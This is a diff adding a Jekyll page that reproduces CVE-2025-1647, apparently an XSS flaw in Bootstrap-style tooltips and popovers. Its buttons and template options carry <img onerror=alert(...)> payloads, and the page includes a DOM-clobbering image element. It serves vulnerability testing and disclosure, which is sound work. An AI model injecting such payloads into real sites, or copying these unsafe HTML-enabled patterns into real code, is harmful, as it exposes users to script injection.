@@ -1,0 +1,53 @@
+---
+layout: default
+title: CVE-2025-1647
+slug: CVE-2025-1647
+---
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+
+<section class="repro-content-section" ng-app="app">
+  <img name="implementation" src="clobbered" style="display: none;" />
+
+  <span class="section-header">Template Injection</span>
+  <div class="row">
+    <button type="button" id="template-tooltip" data-toggle="tooltip" data-placement="top" title="Tooltip on top">Template Tooltip
+    </button>
+  </div>
+
+  <div class="row">
+    <button type="button" id="template-popover" data-toggle="popover" title="Popover Title" data-content="Some content inside the popover">Template Popover
+    </button>
+  </div>
+
+  <br><br>
+  <span class="section-header">HTML Injection</span>
+  <div class="row">
+    <button type="button" id="html-tooltip" data-toggle="tooltip" data-html="true" data-placement="top" title="<img src=x onerror=alert('title-tooltip')>">HTML Tooltip
+    </button>
+  </div>
+
+  <div class="row">
+    <button type="button" id="html-title-popover" data-html="true" data-toggle="popover" title="<img src=x onerror=alert('title-popover')>">HTML Title Popover
+    </button>
+  </div>
+
+  <div class="row">
+    <button type="button" id="html-data-popover" data-html="true" data-toggle="popover" data-content="<img src=y onerror=alert('data-content-popover')>">HTML Data Popover
+    </button>
+  </div>
+</section>
+
+<script>
+  $(document).ready(function () {
+  $("#html-tooltip").tooltip();
+  $("#template-tooltip").tooltip({
+    template: '<img src=z onerror=alert("template-tooltip")>'
+  });
+
+  $("#html-title-popover").popover();
+  $("#html-data-popover").popover();
+  $("#template-popover").popover({
+    template: '<img src=z onerror=alert("template-popover")>'
+  });
+});
+</script>
